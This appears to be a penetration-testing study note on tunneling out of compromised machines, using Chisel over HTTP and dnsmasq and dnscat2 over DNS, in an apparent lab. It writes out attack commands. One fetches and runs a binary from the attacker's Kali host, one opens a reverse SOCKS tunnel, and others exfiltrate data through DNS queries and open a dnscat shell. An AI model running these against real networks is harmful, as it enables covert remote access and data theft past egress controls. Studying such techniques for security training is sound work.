---
layout: blank
---

### HTTP Tunneling Theory/Practice

**HTTP Tunneling Fundamentals**
- Useful when all you have is egress HTTP traffic and no useful inbound ports
- We basically set up a server on kali and use egress traffic from the pwned machine to create an HTTP tunnel allowing inbound commands
- *Chisel* is a good tool for encapsulating data within HTTP
	- Run a server on Kali, client on pwned machine with internal access
		- On Kali: `sudo apt install chisel`, then copy `/usr/bin/chisel` into `/var/www/html` and start apache to make the file available (or just use python???)
		- Can view all traffic to this port with `sudo tcpdump -nvvvXi tun0 tcp port {port}`
	- `chisel server --port {port} --reverse` on kali to run the server
	- `wget {kali_ip}/chisel -O /tmp/chisel && chmod +x /tmp/chisel` for running the Chisel client on the linux target
		- `chisel client {kali_IP}:{kali_port} R:socks > /dev/null 2>&1 &`
	- Then, pass commands with `ssh -o Proxycommand='ncat --proxy-type socks5 --proxy 127.0.0.1:{port_given_by_chisel_(1080)} %h %p' {user}@{internal_IP_1hop}`
		- Need to install `ncat` on kali first
	- Can also be used on Windows
		- From meterpreter, `upload chisel.exe C:\\Users\\{user}\\chisel.exe`
- Can be combined with proxychains
	- Put the socks5 proxy port (from Chisel) in proxychains

### DNS Tunneling Theory/Practice

**DNS Tunneling Fundamentals**
- Register a name server that can communicate with all other nameservers
- Run `sudo dnsmasq -C dnsmasq.conf -d` on the pwned machine that other pwned machines refer to for dns info
	-  `dnsmasq.conf` needs to have `no-resolv`, `no-hosts`, `auth-zone=feline.corp`, and `auth-server=feline.corp` all on newlines
	- -C uses a config file, and -d means no-daemon mode so we can kill it
- On pwned machine, check DNS resolution with `resolvectl status`
	- Can then run something like `nslookup -type=txt www.feline.corp`, as the 2nd pwned machine will look to the 1st for name records and return exfiltrated data
- To view exfiltrated data on DNS server:
	- `sudo tcpdump -i {network interface (like ens192)} udp port 53`
	- `nslookup garbage.{owned_domain}` on pwned machine to test
- Since everything needs to look up domains, it doesn't matter how deep the pwned machine is in the internal network
- Getting data back into the network:
	- Add TXT records to `dnsmasq.conf` with:
		- `txt-record=www.{domain}, {arbitrary data here}`
		- Then restart the server (`sudo dnsmasq.conf -C dnsmasq.conf -d`)

**DNS Tunneling with dnscat2**
- `dnscat2` runs on an authoritative name server for a domain on a pwned nameserver, queried by pwned machines
- `dnscat2-server {domain}` to run, making it listen on all interfaces on udp port 53
	- Similar to above, the domain needs to be specified in `~/dns_tunneling/dnsmasq.conf`
- Then, on client, simply run `dnscat {domain}` to get a shell
- Tunneling:
	- Run `window -i 1` to be able to run commands in the window
	- Once we have a shell, we can use the `listen` command to do a local port forward
	- `listen 127.0.0.1:{inbound_port} {internal_IP}:{desired_port}` 
		- This listens on `inbound_port` on the loopback interface (e.g. only localhost)
		- If we want to listen everywhere, just use `0.0.0.0`
	- Then, use it by simply accessing the inbound port on kali localhost
		- Example: `nmap -p {inbound_port} localhost`